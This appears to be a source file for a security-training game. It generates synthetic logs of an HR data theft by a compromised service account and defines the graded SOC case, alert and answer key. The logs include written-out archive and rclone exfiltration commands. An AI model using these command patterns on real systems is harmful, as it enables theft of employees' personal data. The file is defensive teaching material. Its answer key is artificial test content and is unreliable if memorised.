// Day 4 logs: data theft with a stolen service account.
//   01:55  svc_backup connects to the VPN from 203.0.113.45 (Tuesday's C2 server). Service accounts never use the VPN.
//   01:58  svc_backup logs on to FILE01 over Remote Desktop (logon type 10). Service accounts never log on interactively.
//   02:03  an archive tool packs the HR share into an encrypted archive
//   02:14  a cloud sync tool uploads 4.2 GB to Mega (personal cloud storage), allowed by the proxy
//   02:41  the session ends
// Meanwhile the real nightly backup has been failing since Sunday (disk full), so there's no normal svc_backup noise.

import { T, logBuilder, finishLogs, backgroundNoise } from '../../game/logkit.js';

export const DATE = { weekday: 'THU', name: 'Thursday', month: 'Oct', day: 22, year: 2026, domain: 'halcyonmutual.local', netbios: 'HALCYON' };
export const C2 = '203.0.113.45';

export const IP_INFO = {
  '203.0.113.45': { where: 'Moldova', owner: 'AS-KRANNET hosting', note: 'The C2 server from the USB stick and the fake invoice. Now logging in as svc_backup.', external: true },
  '203.0.113.47': { where: 'Moldova', owner: 'AS-KRANNET hosting', note: 'Sent the fake Northwind bank-change email.', external: true },
  '31.216.145.5': { where: 'New Zealand', owner: 'Mega Limited (cloud storage)', note: 'Personal cloud storage. Not a service we use.', external: true },
};

export function generateLogs({ nowMinutes = 24 * 60 } = {}) {
  const b = logBuilder(1022);
  const { add, ok, proc, logoff } = b;

  add(T(1, 0, 4), 'backup01', 'veeam', 'Job "Nightly-Full" FAILED: insufficient free space on target volume E: (12 MB free). Last success: Sun Oct 18 02:41', { key: 'backup-failed' });

  add(T(1, 55, 12), 'vpn01', 'openvpn', `openvpn[1187]: ${C2}:52211 [svc_backup] Peer Connection Initiated with [AF_INET]${C2}:52211`, { ip: C2, user: 'svc_backup', attack: true, key: 'vpn-svc' });
  add(T(1, 55, 13), 'vpn01', 'openvpn', `openvpn[1187]: svc_backup/${C2}:52211 MULTI_sva: pool returned IPv4=172.16.0.91`, { ip: C2, user: 'svc_backup', attack: true });
  ok(T(1, 58, 40), 'svc_backup', '172.16.0.91', 'FILE01', 10, { attack: true, key: 'rdp-logon' });
  proc(T(2, 3, 2), 'file01', 'svc_backup', 'C:\\Windows\\Temp\\7z.exe', '7z.exe a -mhe=on -p******** C:\\Windows\\Temp\\hr.7z D:\\Shared\\HR', 'C:\\Windows\\System32\\cmd.exe', { attack: true, key: 'archive' });
  for (let i = 0; i < 5; i++) {
    add(T(2, 4 + i, 10), 'file01', 'smbd_audit', `svc_backup|172.16.0.91|pread|ok|Shared/HR/${['Payroll/2026-10_payroll.xlsx', 'Employees/ssn_lookup.xlsx', 'Employees/bank_details_direct_deposit.csv', 'Reviews/2026_performance.docx', 'Benefits/enrollment_2027.xlsx'][i]}`, { user: 'svc_backup', ip: '172.16.0.91', attack: true });
  }
  proc(T(2, 14, 0), 'file01', 'svc_backup', 'C:\\Windows\\Temp\\rclone.exe', 'rclone.exe copy C:\\Windows\\Temp\\hr.7z remote:backup --transfers 8', 'C:\\Windows\\System32\\cmd.exe', { attack: true, key: 'rclone' });
  add(T(2, 39, 51), 'fw01', 'proxy', 'ALLOW user=svc_backup src=172.16.0.91 dst=g.api.mega.co.nz:443 (31.216.145.5) method=CONNECT bytes_out=4512331904 category="Online Storage"', { ip: '31.216.145.5', attack: true, key: 'upload' });
  logoff(T(2, 41, 3), 'svc_backup', 10, { attack: true });
  add(T(2, 41, 5), 'vpn01', 'openvpn', `openvpn[1187]: svc_backup/${C2}:52211 SIGTERM[soft,remote-exit] received, client-instance exiting`, { ip: C2, user: 'svc_backup', attack: true });

  add(T(8, 10, 33), 'mail01', 'postfix', 'postfix/smtpd[877]: connect from mail.northwindsupplies-billing.com[203.0.113.47]', { ip: '203.0.113.47' });
  backgroundNoise(b, {
    arrivals: [
      ['priya.r', T(7, 30)],
      ['dana.k', T(6, 10)],
      ['c.reyes', T(7, 50)],
      ['t.okoye', T(8, 12)],
      ['m.chen', T(8, 20)],
      ['s.okafor', T(8, 1)],
    ],
  });
  // Normal: Finance reading the vendor file before paying.
  add(T(8, 30, 12), 'file01', 'smbd_audit', 'c.reyes|10.0.4.44|pread|ok|Shared/Finance/AP/vendor_master.xlsx', { user: 'c.reyes', ip: '10.0.4.44' });

  return finishLogs(b.ev, { nowMinutes, date: DATE });
}

export const CASE = {
  id: 'case',
  area: 'SOC alert',
  title: '4.2 GB to cloud storage at 2 AM (svc_backup)',
  max: 30,
  teaches: { skill: 'Spot data exfiltration by a service account', secplus: '2.4 Indicators of malicious activity: data exfiltration' },
  verdicts: [
    { id: 'backup', text: 'The nightly backup job, copying to the cloud as designed.' },
    { id: 'exfil', text: 'Data theft: someone used the svc_backup account over the VPN, packed up the HR share and uploaded it to Mega.' },
    { id: 'user', text: 'An employee uploading personal files.' },
  ],
  correctVerdict: 'exfil',
  wrongVerdictNotes: {
    backup: 'The backup job has been failing since Sunday (disk full), and backups never go to Mega. This came in over the VPN from 203.0.113.45.',
    user: 'No employee was involved: it was the svc_backup account, connected over the VPN from the C2 server, at 2 AM.',
  },
  actions: [
    { id: 'disable', text: 'Disable svc_backup and rotate its password (and keep it in the password vault, not on a sticky note)', good: true },
    { id: 'blockcloud', text: 'Block personal cloud storage (Mega) at the proxy', good: true },
    { id: 'blockip', text: `Block ${C2} and kill any VPN session from it`, good: true },
    { id: 'restrict', text: 'Stop service accounts from logging on over VPN or Remote Desktop at all', good: true },
    { id: 'legal', text: 'Tell Legal and HR: employee personal data was stolen', good: true },
    { id: 'ignore', text: 'Close it: service accounts do weird things at night', good: false, why: 'This one did something it should never do: VPN plus Remote Desktop from a known-bad IP.' },
    { id: 'wipe', text: 'Wipe FILE01 right now', good: false, why: 'That destroys the evidence and takes everyone\'s files offline, and the attacker still has the password.' },
  ],
  primaryEvidence: { key: 'upload', note: 'The key evidence is the 4.5 GB upload (bytes_out=4512331904) to g.api.mega.co.nz at 02:39.' },
  keyEvidence: ['upload', 'vpn-svc', 'rdp-logon', 'archive', 'rclone', 'backup-failed'],
  containedRequires: ['disable', 'blockip'],
  costs: {
    contained: { amount: 12000, text: 'Notify 214 employees; credit monitoring; svc_backup locked down' },
    breach: { amount: 140000, text: 'The attacker kept svc_backup access; HR data was stolen and later sold' },
  },
  perfectWhy: 'Exactly: VPN from the C2 server, an interactive logon by a service account, an encrypted archive, then 4.5 GB to Mega. Account dead, door shut.',
  notSubmittedWhy: 'Nobody looked. The attacker still has the svc_backup password.',
};

export const ALERTS = [
  {
    id: 'exfil-svc-backup',
    main: true,
    title: 'Large upload to personal cloud storage (svc_backup)',
    severity: 'High',
    rule: 'More than 1 GB uploaded to an "Online Storage" site in one session.',
    fields: [
      ['Account', 'svc_backup'],
      ['Destination', 'g.api.mega.co.nz (31.216.145.5)'],
      ['Uploaded', '4,512,331,904 bytes'],
      ['Time', '02:14 to 02:39'],
      ['Came in via', `VPN from ${C2}`],
    ],
    trigger: { after: 'tickets', delayMs: 2500, fallbackAt: 10 * 60 },
    notice: '🚨 SIEM alert (High): 4.5 GB uploaded to cloud storage',
    chat: ['Big one: 4.5 GB went out to Mega at 2 AM, under svc_backup. Our backups don\'t go to Mega.', 'SOC console. Who, how, and what did they take?'],
    case: CASE,
  },
];
